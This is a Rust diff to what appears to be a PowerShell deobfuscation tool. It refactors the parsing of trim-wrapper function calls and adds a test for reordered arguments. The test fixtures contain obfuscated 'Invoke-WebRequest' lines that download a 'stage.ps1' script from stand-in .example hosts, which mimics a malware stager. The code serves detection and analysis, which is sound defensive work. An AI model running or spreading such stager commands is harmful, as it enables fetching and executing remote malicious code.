@@ -5698,44 +5698,18 @@ fn inline_ps_literal_trim_calls(
                     continue;
                 }
             }
-            let (call_end, replacement) = if let Some(chars_idx) = spec.chars_idx {
-                let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+            let (call_end, replacement) = if spec.chars_idx.is_some() {
+                let Some((call_end, value, chars)) =
+                    parse_ps_positional_literal_trim_chars_args(text, pos, parenthesized, spec)
+                else {
                     search_from = end_name;
-                    continue;
-                };
-                if first.len() > 8192 {
-                    search_from = first_end;
-                    continue;
-                }
-                pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-                let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
-                    search_from = first_end;
-                    continue;
-                };
-                let mut call_end = second_end;
-                if parenthesized {
-                    let after = skip_ascii_ws(bytes, call_end);
-                    if bytes.get(after) != Some(&b')') {
-                        search_from = second_end;
-                        continue;
-                    }
-                    call_end = after + 1;
-                }
-
-                let args = [&first, &second];
-                let Some(value) = args.get(spec.value_idx).copied() else {
-                    search_from = call_end;
-                    continue;
-                };
-                let Some(chars) = args.get(chars_idx).copied() else {
-                    search_from = call_end;
                     continue;
                 };
                 if chars.is_empty() {
                     search_from = call_end;
                     continue;
                 }
-                let trimmed = spec.kind.apply_chars(value, chars);
+                let trimmed = spec.kind.apply_chars(&value, &chars);
                 if trimmed.len() > 8192 {
                     search_from = call_end;
                     continue;
@@ -5770,6 +5744,51 @@ fn inline_ps_literal_trim_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+fn parse_ps_positional_literal_trim_chars_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    spec: PsLiteralTrimExtractorSpec<'_>,
+) -> Option<(usize, String, String)> {
+    let chars_idx = spec.chars_idx?;
+    if spec.arg_count == 0
+        || spec.arg_count > 8
+        || spec.value_idx >= spec.arg_count
+        || chars_idx >= spec.arg_count
+    {
+        return None;
+    }
+
+    let bytes = text.as_bytes();
+    let mut value = None;
+    let mut chars = None;
+    let mut arg_end = pos;
+    for idx in 0..spec.arg_count {
+        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
+        if idx == spec.value_idx {
+            value = Some(arg.as_str()?.to_string());
+        }
+        if idx == chars_idx {
+            chars = Some(arg.as_str()?.to_string());
+        }
+        arg_end = next_end;
+        pos = next_end;
+        if idx + 1 < spec.arg_count {
+            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
+        }
+    }
+
+    if parenthesized {
+        let after = skip_ascii_ws(bytes, arg_end);
+        if bytes.get(after) != Some(&b')') {
+            return None;
+        }
+        arg_end = after + 1;
+    }
+
+    Some((arg_end, value?, chars?))
 }
 
 fn inline_ps_named_literal_trim_call(
@@ -9594,6 +9613,23 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
             "trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_trim_extractor_reordered_call_is_rewritten() {
+        let text = r#"function Clean($unused,$value,$chars) {
+  return $value.Trim($chars)
+}
+Clean 0 '~~~Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1'"
+            ),
+            "reordered trim extractor call was not rewritten:\n{out}"
         );
     }
 
